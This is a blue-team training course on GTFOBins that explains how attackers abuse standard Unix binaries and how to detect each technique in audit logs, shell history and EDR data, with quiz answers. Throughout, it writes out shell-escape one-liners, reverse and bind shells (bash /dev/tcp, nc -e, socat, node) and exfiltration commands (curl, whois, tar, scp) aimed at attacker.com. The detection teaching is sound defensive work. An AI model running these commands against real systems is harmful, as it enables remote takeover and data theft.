# GTFOBins

In this comprehensive course, participants will gain valuable insights  into the techniques used by attackers to circumvent security measures on Unix-based systems through the use of legitimate binaries. By  leveraging practical, hands-on lab exercises, learners will gain a  deeper understanding of the threat landscape and develop the skills  necessary to identify and respond to such attacks.

**Table of Contents:**

- [Introduction to GTFOBins](#introduction-to-gtfobins)
- [Shell](#shell)
- [Command](#command)
- [Reverse Shell](#reverse-shell)
- [Bind Shell](#bind-shell)
- [File Upload](#file-upload)
- [File Download](#file-download)
- [Sudo](#sudo)

**Evaluate Yourself with Quiz**

- [GTFOBins Quiz](https://app.letsdefend.io/training/quiz/gtfobins-quiz)

## Introduction to GTFOBins

The concept of GTFOBins is a list of *nix applications that can be  used for privilege escalation or bypassing security checks on *nix  (Unix, Linux, OSX) systems. It contains information about which uses  will be considered suspicious during the use of legal *nix applications  in this list. This application list and usage of applications is not a  list of exploits.

Many of the applications listed on *nix systems come by default. This causes attackers to have the ability to utilize these applications in  various activities (discovery, connecting to the command center, etc.)  without needing an additional applications on a compromised *nix system.

GTFOBins has classified these apps into various categories as below.  We will provide samples for the applications for each category. Some  certain applications may be considered for multiple categories as the  command/application is capable of performing activities in multiple  categories.

1. Shell
2. Command
3. Reverse Shell
4. Bind Shell
5. File Upload
6. File Download
7. Sudo

We will also cover common practices within this context and detail  how to detect suspicious use cases. For the detection methods mentioned  here, (unless otherwise specified), the audit service of the *nix system to which the detection is desired must be open or the EDR product must  record all activities or the commands that are running on the command  line must be recorded.

Those who will continue the education must have a through knowledge  of Linux 101 so that they can get the best out of this training. We  highly recommend that you should complete the "[Linux for Blue Team](https://app.letsdefend.io/training/lessons/linux-for-blue-team)" course first if you think that you are not enough in this topic.

# Shell

Attackers may want to switch to different shells if the shell they  encounter is limited in the systems they have seized. In such cases,  they use the shells on *nix systems directly or by finding alternative  ways to gain more interactive access on the system they have seized. In  order to detect such situations, it is recommended that the programs  that are detailed below should be used.

*nix systems may have one or more shells that come by default because these shells have different features (command completion, history  keeping, etc.). We provide detailed information on these shells below.  The list of shells that are available on a *nix system can be accessed  by running the "cat /etc/shells" command as shown below:

[root@master ~]# cat /etc/shells  /bin/sh  /bin/bash  /usr/bin/sh  /usr/bin/bash

Alternative to the ones above, there are also some other *nix shells  like capsh, csh, dash, fish, ginsh, ksh, sash, yash, wish, zsh. You can  use these shells, simply typing and pressing enter.

In addition to these, the following *nix applications also allow using the *nix shell with different methods:

### **# awk Command**

In *nix systems, the **awk** command is used for  operations such as searching, listing, and obtaining output in files. In the awk command, the BEGIN rule runs the first record without  reading/interpreting it. This way, a shell can be created with the awk  command.

```
# awk 'BEGIN {system("/bin/sh")}'
```

For detection; The usage status of the command related to the awk  command is monitored and the status of the "BEGIN" statement on the  command line should be checked when this command is being used.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “awk”   [The /bin/sh EXECVE audit log that occurs at the same time as awk usage, if any, is searched in the output of this command.]   - Searchable from history on Linux system.  # history |grep “awk” |grep -i “begin”  or  # cat ~/.bash_history | grep “awk” |grep -i “begin”   - Searchable from “awk” process create events in EDR/XDR logs.  Afterwards, it is checked whether there is a "begin" parameter on the  command line.

### **# busybox Command**

**Busybox** command contains many applications on *nix  systems. By running the "busybox /bin/sh" command, you can load the sh  shell in busybox and run the command on this shell.

```
# busybox /bin/sh
```

By using the following command, the executable commands in busybox can be listed:

```
# busybox --list-full  bin/ash  usr/bin/awk  usr/bin/bzcat  bin/cat  bin/chgrp  bin/chmod  bin/chown  usr/sbin/chroot  bin/cp  usr/bin/cut  bin/date
```

For detection; In the busybox command use cases, it should be  considered suspicious and investigated if the command line of the  running command contains any shell expression (i.e. shells in the list  above)

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “busybox” |grep “bin/sh”   - Searchable from history on Linux system.  # history |grep “busybox” |grep “bin/sh”  or  # cat ~/.bash_history | grep “busybox” |grep “bin/sh”   - Searchable from “busybox” process create events in EDR/XDR logs.

### **# cpan Command**

**cpan** command is used to run Perl commands. After  running the cpan command, the bash shell can be opened by typing “! exec '/bin/bash'”

```
# cpan  cpan[1]> ! exec '/bin/bash'
```

For detection; The cpan command is not a frequently used common  command. It may trigger an alarm when it is used alone and this requires investigation.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “cpan”   - Searchable from history on Linux system.  # history |grep “cpan”  or  # cat ~/.bash_history | grep “cpan”   - Searchable from "cpan" process create events in EDR/XDR logs.

### **# env command**

The **env** command displays all the variables that are  changed in the system. if a shell path is given to the env command as a  parameter, it will run that shell. When the env command is run as in the example below, the /bin/sh shell gets activated and new commands are  run on this shell.

```
# env /bin/sh
```

For detection; The env command is not a frequently used common  command. It may trigger an alarm when it is used alone and this requires investigation.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “env” |grep “bin/sh”   - Searchable from history on Linux system.  # history |grep “env” |grep “bin/sh”  or  # cat ~/.bash_history | grep “env” |grep “bin/sh”   - Searchable from “env” process create events in EDR/XDR logs.

### **# find command**

The **find** command is used for file/directory searches on the system. Different commands can be run with the -exec parameter  of this command that allows the use of any shell after the -exec  parameter.

```
# find . -exec /bin/sh \; -quit
```

For detection; Usage activity of the find command with the -exec  parameter should be monitored and the value given after the -exec  parameter should be examined. It is considered suspicious, and it should get investigated if this value represents a shell.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep "find" |grep "exec" |grep "/bin/sh"   - Searchable from history on Linux system.  # history |grep “find” |grep “exec” |grep "/bin/sh"  or  # cat ~/.bash_history | grep “find” |grep “exec” |grep "/bin/sh"   - Searchable from "find" process create events in EDR/XDR logs.  Afterwards, it is checked whether there is an "exec" parameter on the  command line.

### **# nmap command**

The **nmap** command is used for operations such as port scanning and vulnerability detection through some special scripts on  *nix systems. In order to open a shell with the nmap command, a  temporary file or directory is created with the “mktemp” command first,  then, any shell is run with os.execute which is one of the nmap script  functions. This way, a different shell is opened and used in *nix system with nmap.

```
# TF=$(mktemp)  # echo 'os.execute("/bin/sh")' > $TF   # nmap --script=$TF
```

For detection; 

Usage activity of the nmap command with the "--script" parameter should be monitored.

The script details used here must be examined and should be  considered suspicious if there is a case that expresses a shell. Also,  if the nmap command was used in an unauthorized manner in the *nix  systems, it is a suspicious activity for sure.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “nmap” | grep “script”  [The /bin/sh EXECVE audit log that occurs at the same time as nmap usage, if any, is searched in the output of this command.]   - Searchable from history on Linux system.  # history |grep “nmap” | grep “script”  or  # cat ~/.bash_history | grep “nmap” | grep “script”   - Searchable from “nmap” process create events in EDR/XDR logs.  Afterwards, it is checked whether there is a "script" parameter on the  command line.

### **# perl command**

If perl is installed on the *nix system, a shell can be opened with the **perl** command. As in the example below, the command can be run with the "-e" parameter of the perl command. This shell can be opened and used if the path of a shell installed on the system is given as a command.

```
# perl -e 'exec "/bin/sh";'
```

For detection; It is considered suspicious if the "exec" parameter is followed by a shell information when the perl command is run.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “perl” | grep “\-e”  [The /bin/sh EXECVE audit log that occurs at the same time as perl usage, if any, is searched in the output of this command.]   - Searchable from history on Linux system.  # history |grep “perl” | grep “\-e”  or  # cat ~/.bash_history | grep “perl” | grep “\-e”   - Searchable from “perl” process create events in EDR/XDR logs.  Afterwards, it is checked whether there is a "exec" parameter on the  command line.

### **# python command**

If **python** is installed on the *nix system, a shell  can be opened with the python command. The command can be run with the  "-c" parameter of the python command. As in the example below, the  "/bin/bash" shell can be opened and used in the import.system library by loading the "import.os" and "import.system" libraries.

```
# python -c 'import os; os.system("/bin/sh")'
```

For detection; When the python command is run, we should check see if there is an "os.system" parameter on the command line, if there is  any, then it is considered suspicious.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “python”   [The /bin/sh EXECVE audit log that occurs at the same time as python usage, if any, is searched in the output of this command.]   - Searchable from history on Linux system.  # history | grep “python” | grep “os.system”  or  # cat ~/.bash_history | grep “python” | grep “os.system”   - Searchable from "python" process create events in EDR/XDR logs.  Afterwards, it is checked whether there is an "os.system" parameter on  the command line.

### **# vi/vim command**

vi or vim commands are used to create and edit files on *nix systems. In short, we can call it a file editor. But it contains a lot of  features in vi/vim applications. One of them is to run a command with  the "-c" parameter. As you can see in the example below, the sh shell is opened and used when the /bin/sh command is run with the -c parameter.

```bash
# vim -c ':!/bin/sh'
```

For detection; If the "-c" parameter is followed by a shell  information when vi/vim is run, this activity is considered suspicious.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | egrep "vi|vim" |grep "\-c"   - Searchable from history on Linux system.# history |grep “perl” | egrep “vi|vim” | grep “\-c”  or  # cat ~/.bash_history | egrep “vi|vim” | grep “\-c”   - Searchable from “vi” or “vim” process create events in EDR/XDR logs.  Afterwards, it is checked whether there is a "-c" parameter on the  command line.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - What application which is normally supposed to be used as a text editor was run to use the /bin/sh shell?

> **Answer:** vim

2 - Which application used the /bin/ash shell?

> **Answer:** busybox

3 - What application which is normally supposed to be used to search for files/directories was run to use the /bin/sh shell?

> **Answer:** find

## Command

A shell is communicated when using the terminal on *nix systems. The  task of this shell is to interpret or analyze the given commands so that these commands are understandable by the kernel. In summary, the shell  is the intermediary that provides communication between the user and the kernel of the operating system.

The commands/applications run on the shell can be operated in 2 different ways: Interactive and Non-Interactive.

### 1- Interactive Shell 

It is a shell form that takes the commands from the user as input and displays the output to the user after executing the commands.

### 2- Non-Interactive Shell

As its name expresses, it is a type of shell that does not have  direct input from the user. Commands run from a script or a different  application work non-interactively.

For example;

The command below shows whether the shell you are in is interactive vena non-interactive.

```
[root@master ~]# [[ $- == *i* ]] && echo ‘Interactive’ || echo ‘not-interactive’
```

\- When the command is run directly on a shell, you can see its output as "Interactive".

```
[root@master ~]# [[ $- == *i* ]] && echo ‘Interactive’ || echo ‘not-interactive’  ‘Interactive’
```

\- When the command is run in a shell script, you can see that the output is "not-interactive".

```
[root@master ~]# cat check.sh  #!/bin/bash  [[ $- == *i* ]] && echo ‘Interactive’ || echo ‘not-interactive’   [root@master ~]# ./check.sh  ‘not-interactive’
```

### **# at command**

The **at** command in *nix systems enables a scheduled  job to be performed once at a future date. Attackers can also use the  “at” command to run non-interactive commands on the systems they have  captured.

As you can see in the example below, the COMMAND variable is defined  first. This definition content creates the file “/tmp/test.txt” and adds “test” to its content. It is ensured that the defined value is run  directly with the "at now" command. The success of the desired operation is verified by the "test" statement in the test.txt file content.

```
# COMMAND='echo "test" > /tmp/test.txt'   # echo $COMMAND | at now  job 18 at Sat Sep 24 19:17:00 2022 # cat /tmp/test.txt  test
```

For detection; The “at” command is not a frequently used command on  *nix systems. It should be investigated directly in case its use is  detected.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “at”   - Searchable from history on Linux system.  # history |grep “at”  or  # cat ~/.bash_history | grep “at”   - Searchable from “at” process create events in EDR/XDR logs.

### **# crontab command**

The **crontab** command allows to manage scheduled  tasks. Defined tasks are executed at the specified time or time period  which is a non-interactive process to be operated. The "-e" parameter of the crontab command is the parameter that allows editing scheduled  tasks (such as adding, deleting, etc.).

```
# crontab -e 
```

For detection; The usage activity should be monitored with the "-e"  parameter of the crontab command. In addition, changes in /etc/cron*  file directories should be monitored, and in case of any changes, an  alarm should be generated and the event should be investigated.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “crontab” | grep "\-e"   - Searchable from history on Linux system.  # history |grep “crontab” | grep "\-e"  or  # cat ~/.bash_history | grep “crontab” | grep "\-e"   - Searchable from "crontab" “process create events” in EDR/XDR logs.  Afterwards, it should be checked to see if there is any "-e" parameter  on the command line. 

### **# nohup command**

The **nohup** command is usually used for operations  that are supposed to last long to continue in the background. You can  see in the example below that the "id" command is assigned to the  COMMAND variable. The output of the command run with nohup is written to the nohup.out file and when you view the contents of this file, the  "id" command is run and the output of this command is included.

```
# COMMAND='/usr/bin/id'  # nohup "$COMMAND"  # cat nohup.out  uid=0(root) gid=0(root) groups=0(root)
```

For detection; The nohup command is not a commonly used command,  except for system administrators. Detection of the use of this command  in an unauthorized manner is highly suspicious and it should be  investigated.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “nohup”   - Searchable from history on Linux system.  # history |grep “nohup”  or  # cat ~/.bash_history | grep “nohup”   - Searchable from “nohup” process create events in EDR/XDR logs.

### **# split command**

The **split** command is used to split files (i.e. split 500 lines by line) on the *nix systems. The "--filter" parameter of the split command allows shell commands to be run. You can see in the  example below that the "id" command is given to the "--filter" parameter and this value is printed to the screen with echo.

```
echo |split --filter=id
```

For detection; The usage of the split command with the "--filter" parameter should be monitored.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “split” |grep “filter”   - Searchable in history on Linux system.  # history |grep “split” |grep “filter”  or  # cat ~/.bash_history | grep “split” |grep “filter”   - Searchable in "split" process create events in EDR/XDR logs.  Afterwards, it should be checked to see if there is a "filter" parameter on the command line.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - With which application was the activity corresponding to the “T1087.001 - Account Discovery: Local Account” Mitre ATT&CK technique run  non-interactively?

> **Answer:** at

2 - What is the username created with the activity corresponding to  “T1136.001 - Create Account: Local Account” Mitre ATT&CK technique  non-interactively?

> **Answer:** letsdefend

3 - With which application/command was the activity corresponding to “T1053 - Scheduled Task/Job” Mitre ATT&CK technique executed  non-interactively?

> **Answer:** crontab

4 - What is the key information added in the activity corresponding to the  “T1098.004 - Account Manipulation: SSH Authorized Keys” Mitre ATT&CK technique, which was carried out non-interactively?

> **Answer:** congratulations

## Reverse Shell

Reverse shell is a type of shell in which the target system  communicates back to the host system (command center). Commands sent by  the host system to the target system over the port it listens to in  order to establish the connection are executed on the target system. In  *nix systems, some applications allow establishing reverse shell. These  applications provide convenience to remotely manage the compromised  system for attackers. For this reason, we will go over how these  applications are used, in what conditions they are considered  suspicious, and how to detect them under this topic.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/GTFOBins/4-img1.png)

To test the examples below, run the following command to accept  incoming connections on the main system (command center). The nc  (netcat) command starts listening on the port (12345) after the -l  (listen) -p (port) parameters and the -p parameter and accepts requests  coming to this port.

```
# nc -l -p 12345
```

### **# bash command**

**bash** is the command that allows you to open the bash  shell in the *nix terminal as well as switching to the bash shell. This  command can also be used to run different commands with the -c  parameter. The -i parameter makes the shell interactive.

```
# export RHOST=attacker.com  # export RPORT=12345  # bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```

For detection; When the bash command is run, the usage status of  /dev/tcp or /dev/udp expressions on the command line is monitored.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “bash” | egrep “udp|tcp”   - Searchable from history on Linux system.  # history |grep “bash” | egrep “udp|tcp”  or  # cat ~/.bash_history | grep “bash” | egrep “udp|tcp”   - It can be searched from the "bash", process create or network  connection events in the EDR/XDR logs. Afterwards, it is checked whether there is a "udp" or "tcp" parameter on the command line.

### **# nc command**

The **nc** (netcat) application is a simple *nix  application that reads and writes data over the network using tcp or udp protocols. nc application can be used in activities such as reverse  shell or bind shell. The -e parameter stands for “exec” and transmits  the data coming from the defined port such as /bin/sh or /bin/bash to  the defined shell. As in the example below, commands transmitted from  the command center are run by /bin/sh because incoming requests are  directed to /bin/sh.

```
# RHOST=attacker.com  # RPORT=12345  # nc -e /bin/sh $RHOST $RPORT
```

After the above commands are run, access to the target system  (command center) is established. Information transmitted from the target system is forwarded to /bin/sh and executed by /bin/sh.

```
# nc -l -p 12345  id (After connecting with the command above, the "id" command was run.)  uid=0(root) gid=0(root) groups=0(root)
```

For detection; All uses of the nc command except known operations  require examination. Therefore, if the execution of the command is not a known activity, it is considered suspicious. Uses, especially with the  -e and -l parameter, can be questionable.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “nc” | grep "\-e"   - Searchable from history on Linux system.  # history |grep “nc” | grep "\-e"  or  # cat ~/.bash_history | grep “nc” | grep "\-e"   - It can be searched from “nc” process create or network connection  events in EDR/XDR logs. Afterwards, the "-e" parameter usage status is  checked on the command line.

### **# socat command**

**socat** can be considered as an alternative to the netcat (nc) command. It provides access to the target system via tcp or udp  protocol. It enables to run the information that comes with the "exec"  parameter. By sending this information to a *nix shell, remote command  execution can be achieved.

```
# RHOST=attacker.com  # RPORT=12345  # socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

For detection; All uses of the socat command except for the known  operations require investigation. In addition, the "exec" parameter and  the tcp-connect parameter of the command are considered suspicious and  they should be investigated.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “socat” | grep -i “exec”   - Searchable from history on Linux system.  # history |grep “socat” | grep -i “exec”  or  # cat ~/.bash_history | grep “socat” | grep -i “exec”   - It can be searched from "socat" process create or network connection  events in EDR/XDR logs. Afterwards, it should be checked whether there  is an "exec" parameter on the command line.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - Which application was utilized to establish the reverse-shell connection to the IP address 172.16.8.193?

> **Answer:** nc

2 - Which application was utilized to establish the reverse-shell connection to the destination port of 5458?

> **Answer:** bash

3 - By which shell the commands that are run by the TCP/8443 reverse-shell connection made with the socat application are executed?

> **Answer:** /bin/bash

4 - Which protocol does the reverse-shell connection to the 172.16.1.33 IP address use?

> **Answer:** TCP

## Bind Shell

A bind shell is a type of shell that connects directly to the target  (compromised) system through the main system (command center) through a  port opened in this system. It is operated by an application that  listens the port on the target system through commands/packets etc. sent from the main system.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/GTFOBins/5-img1.png)

In order to test the examples below, the following netcat command can be used to access the listening port on the target system from the host (command center).

```
# nc target.com 12345
```

### **# nc command**

The nc (netcat) application is a simple *nix application that reads  and writes data over the network using tcp or udp protocols. nc  application can be used in activities such as reverse shell or bind  shell. The -e parameter stands for exec and transmits the data coming  from the defined port such as /bin/sh or /bin/bash to the defined shell. The -l parameter is for listen and the -p parameter is for determining  the port to be taken into listen mode. In the example below, netcat  listening on the specified port forwards the incoming packets to  /bin/sh.

```
# LPORT=12345  # nc -l -p $LPORT -e /bin/sh
```

After the above commands run on the target system, access to the main system (command center) is established and shell commands can be run  directly on the target system.

```
# nc target.com 12345  id (After connecting with the command above, the "id" command was tried.)    uid=0(root) gid=0(root) groups=0(root)
```

For detection; All uses of the nc command except known operations  require further investigation. Therefore, if the execution of the  command is not a known activity, it is considered suspicious. Also the  uses, especially with the -e and -l parameters, can be questionable.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “nc” | egrep “l|e”   - Searchable from history on Linux system.  # history | grep “nc” | egrep “l|e”   or   # cat ~/.bash_history | grep “nc” | egrep “l|e”  - It can be searched on “nc” process create or network connection events in EDR/XDR logs. Afterwards, it is checked whether there is a "-e" or  “-l” parameter on the command line.

### **# node command**

node (nodejs) is an application that allows to run javascript  applications on the server side. As stated in the example below, a bind  shell (reverse shell with minor changes) can be prepared with a small  port listening script that can be written with nodejs.

```
# export LPORT=12345  # node -e 'sh = require("child_process").spawn("/bin/sh");  require("net").createServer(function (client) {   client.pipe(sh.stdin);   sh.stdout.pipe(client);   sh.stderr.pipe(client);}).listen(process.env.LPORT)'
```

For detection; Nodejs is not installed by default on most *nix  systems. Installation or direct use of the application should be  monitored and investigated. Listen function or “-e” (eval) parameter  usage should be monitored as well.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “node” | grep "\-e"   - Searchable from history on Linux system.  # history |grep “node” | grep "\-e"   or   # cat ~/.bash_history | grep “node” | grep "\-e"   - It can be searched from "node" process create or network connection  events in EDR/XDR logs. Afterwards, it is checked whether there is a  "-e" parameter on the command line.

### **# socat command**

socat command can be considered as an alternative to the netcat (nc)  command. It provides access to the target system via tcp or udp  protocol. It enables to run the information that comes with the "EXEC"  parameter. Remote command execution can be achieved by sending this  information to a *nix shell.

```
# LPORT=12345  # socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

For detection; All uses of the socat command except for the known  operations require investigation. In addition, the "EXEC" parameter and  the tcp-connect parameter of the command should be considered suspicious and further investigated.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “socat” | grep -i “EXEC”   - Searchable from history on Linux system.# history |grep “socat” | grep -i “EXEC”   or   # cat ~/.bash_history | grep “socat” | grep -i “EXEC”   - It can be searched from "socat" process create or network connection  events in EDR/XDR logs. Afterwards, it is checked whether there is an  “EXEC” parameter on the command line.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - Which application was utilized to establish the bind-shell connection to the target port 3389?

> **Answer:** nc

2 - Which port was the socat application was run to establish a bind-shell connection? (TCP protocol)

> **Answer:** 443

3 - In order for Bind-Shell  access over the 8080 port to be successful, which Linux application that corresponds to the Mitre ATT&CK technique, “T1562.004 - Impair  Defenses: Disable or Modify System Firewall” did the attacker use?

> **Answer:** firewall-cmd

4 - What application did the  system administrator who noticed the Bind-Shell activity, detect that  the IP address 172.16.1.77 was accessed by bind-shell?

> **Answer:** netstat

## File Upload

Attackers often leak the sensitive information and smuggle data from  the systems they seize. We will be covering the use of some applications they can utilize in *nix systems in such cases.

**Note:** All of the commands below can also be used in "File Download" operations.

### **# curl command**

The **curl** command is an application used on *nix  systems to pull or load data from the target. It supports many different protocols like HTTP, HTTPS, FTP, SCP, etc. As in the command below, the -X parameter determines the method (GET, POST, PUT, DELETE, etc.) and  the -d parameter determines and specifies the data to be transferred to  the remote location.

```
# URL=http://attacker.com/  # LFILE=file_to_send  # curl -X POST -d @$file_to_send $URL
```

For detection; Parameters such as "-X POST" and "-d" related to the  use of curl application should be monitored. In addition, it should be  questioned whether the destination (IP/domain) to which the file is  transferred is a known destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “curl” |grep “X”   - Searchable from history on Linux system.  # history | grep “curl” | grep “X”  or  # cat ~/.bash_history | grep “curl” |grep “X”    - It can be searched in "curl" process create or network connection  events in EDR/XDR logs. Afterwards, the commands like "X" or "POST" are  searched on the command line.

### **# ftp command**

**ftp** is a file transfer protocol and performs  operations such as downloading or uploading files. Attackers can use ftp applications to download malicious applications on the systems they  have compromised or to transfer sensitive data to a remote location.

```
# RHOST=attacker.com   # ftp $RHOST   # put file_to_send
```

For detection; Executing the ftp command directly may generate too  many false positives as the ftp command is generally used for some  operational processes. Therefore, it should be questioned whether the  destination (IP/domain) to which the file is transferred is a known  destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “ftp”   - Searchable from history on Linux system.  # history | grep “ftp”  or  # cat ~/.bash_history | grep “ftp”   - It can be searched from "ftp" process create or network connection events in EDR/XDR logs.

### **# scp command**

**scp** stands for "Secure Copy" and it is an  application for transferring files between systems. It uses the SSH  (secure shell) protocol for file transfer. As stated below, the file to  be sent is stated first, then the target system and the directory where  the file will be loaded on the target system are specified.

```
# RPATH=user@attacker.com:~/file_to_save   # LPATH=file_to_send   # scp $LFILE $RPATH   # scp test_file root@target_system:/root/
```

For detection; Executing the scp command directly may generate too  many false positives as the scp command is generally used for some  operational processes. Scp usage within the network should be monitored  closely, and usage detections except for the known usage cases should be further investigated. In addition, it should be questioned whether the  destination (IP/domain) to which the file is transferred is a known  destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “scp”   - Searchable from history on Linux system.  # history | grep “scp”  or  # cat ~/.bash_history | grep “scp”   - It can be searched from "scp" process create or network connection events in EDR/XDR logs.

### **# whois command**

whois is an application that performs querying information about IP  Address or Domain (registration date, email address, who it belongs to). Whois application can also be used for file transfer operations. In the whois command, the host address to be accessed is specified with the -h parameter, and the destination port information is specified with the  -p parameter. Then the file content of “file_to_send” defined with “cat  $LFILE” executed as a 2nd command is forwarded to the target host.

```
# RHOST=attacker.com  # RPORT=12345# LFILE=file_to_send  # whois -h $RHOST -p $RPORT "`cat $LFILE`"
```

For detection; The usage status of the whois command with -h or -host parameter should be monitored closely. In addition, it is should be  questioned whether the destination (IP/domain) to which the file is  transferred is a known destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “whois” | grep “h”   - Searchable from history on Linux system.  # history | grep “whois” | grep “h”  or  # cat ~/.bash_history | grep “whois” | grep “h”   - It can be searched from "whois" process create or network connection  events in EDR/XDR logs. Afterwards, the "-h" parameter is checked on the command line.

### **# tar command**

The tar application is used for operations such as creating or  unarchiving on *nix systems. This command is capable of specifying a  remote target location where the archiving will be implemented. In this  way, the archive can be created in a remote location while the data is  being archived. While creating the archive, it creates the remote  location via ssh. As in the example below, the tar command creates an  archive with the "cvf" parameter. The remote location is determined as  user@target_system:/archive_file as the location where the archive will  be created. At the same time, the -rsh-command parameter specifies the  type of access to the remote system. In this way, it is ensured that the archived data is created directly in a remote location via ssh.

```
# RHOST=attacker.com  # RUSER=root  # RFILE=/tmp/file_to_send.tar  # LFILE=file_to_send  # tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
```

For detection; The usage of the tar command with the -rsh-command  parameter should be monitored closely. In addition, it is should be  questioned whether the destination (IP/domain) to which the file is  transferred is a known destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “tar” | grep "\-\-rsh\-command"   - Searchable from history on Linux system.  # history | grep “tar” | grep "\-\-rsh\-command"  or  # cat ~/.bash_history | grep “tar” | grep "\-\-rsh\-command"   - It can be searched from "tar" process create or network connection  events in EDR/XDR logs. Afterwards, the "--rsh-command" parameter is  checked on the command line.

### Questions

**NOTE:** The answers are in the gtfo.log or history records. You can find the answers by searching in these files. 

**Log File Location:** /root/Desktop/QuestionFiles/

1 - What is the hostname information of the target system to which the data  is uploaded using Mitre ATT&CK technique “T1596.002 - Search Open  Technical Databases: WHOIS”?

> **Answer:** cc.letsdefend.local

2 - What is the name of the source file uploaded to the system with the IP address 172.16.1.67?

> **Answer:** cc.txt

3 - What method is utilized to upload a file using curl command?

> **Answer:** POST

4 - Which application was  utilized to upload the “hidden.txt” file which is uploaded with the  “T1105 - Ingress Tool Transfer” Mitre ATT&CK technique?

> **Answer:** ftp

5 - To which directory the “users.db” file, which was uploaded using “T1105 - Ingress Tool Transfer” Mitre ATT&CK technique, was uploaded on the  target system?

> **Answer:** /var/www/html/

## File Download

Attackers will definitely want to download various files in order to  perform different activities (lateral movement, encrypting data,  privilege escalation, etc.) on the systems they seize. We will covering  those legal applications that they can utilize in *nix systems in such  cases. We will detail those applications, their functions and suspicious uses of these applications.

**Note:** All of the commands below can also be used in "File Upload" operations.

### **# wget command**

Wget is a file upload/download tool. It supports protocols such as  HTTP, HTTPS, FTP. Using the wget command with the -O parameter, the file at the specified destination could be downloaded as the directory/file.

```
# URL=http://attacker.com/file_to_get  # LFILE=file_to_save  # wget $URL -O $LFILE
```

For detection; The usage of the wget command along with the “-O”  parameter is monitored closely. In addition, it should be questioned  whether the destination (IP/domain) to which the file is transferred is a known destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “wget” | grep "\-O"   - Searchable from history on Linux system.  # history |grep “wget” | grep "\-O"  or  # cat ~/.bash_history | grep “wget” | grep "\-O"   - It can be searched from "wget" process create or network connection events in EDR/XDR logs.

### **# nc command**

The **nc** (netcat) application is a simple *nix  application that reads and writes data over the network using tcp or udp protocols. In this way, it can also perform file transfer operations.

For testing, run the following command on the remote system which  will simply send the file "file_to_send" to the 12345 port of the  target.

```
nc target.com 12345 < "file_to_send"
```

The commands that need to be run on the target system where the file  will be downloaded are as below. The output of the requests to port  12345 is saved in the file "file_to_save" and the file is ready to be  downloaded to the local system remotely.

```
# LPORT=12345  # LFILE=file_to_save  # nc -l -p $LPORT > "$LFILE"
```

For detection; The "-l" parameter of the nc command and the usage status of the ">" operator should be monitored.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “nc” | grep “-l”   - Searchable from history on Linux system.  # history |grep “nc” | grep “-l”  or  # cat ~/.bash_history | grep “nc” | grep “-l”   - It can be searched from “nc” process create or network connection events in EDR/XDR logs.

### **# sftp command**

**sftp** is a protocol used for secure file transfer. It provides an interactive (see 3.Command) file transfer over SSH. After  connecting to the target system, the file download operation is  performed on the target system with the "get" command.

```
# RHOST=user@attacker.com  # sftp $RHOST  # get file_to_get file_to_save
```

For detection; sftp usage with the "get" parameter should be  monitored closely. In addition, it should be questioned whether the  destination (IP/domain) to which the file is transferred is a known  destination.

- Searchable in Linux audit logs.  # cat /var/log/audit/audit.log | grep “sftp”   - Searchable from history on Linux system.  # history | grep “sftp”  or  # cat ~/.bash_history | grep “sftp”   - It can be searched from "sftp" process create or network connection events in EDR/XDR logs.

### **# ssh command**

The ssh application is basically used to connect to a remote system  or run commands on a remote system. The ability to run commands on the  remote system can be used for operations such as "File Download" or  "File Upload". ssh command displays the file to be downloaded with the  "cat" command after being connected to the remote system as you can see  in the example below. Then, utilizing the ">" function, it prints the data to a local file without printing it on the screen. This is how  the "File Download" operation is performed with the ssh command.

```
# HOST=user@attacker.com  # RPATH=file_to_get  # LPATH=file_to_save  # ssh $HOST "cat $RPATH" > $LPATH
```

For detection; In the continuation of the ssh command, the usage of  the ">" operator of the command line or the use cases of file viewing tools such as "cat, tac" are monitored closely.

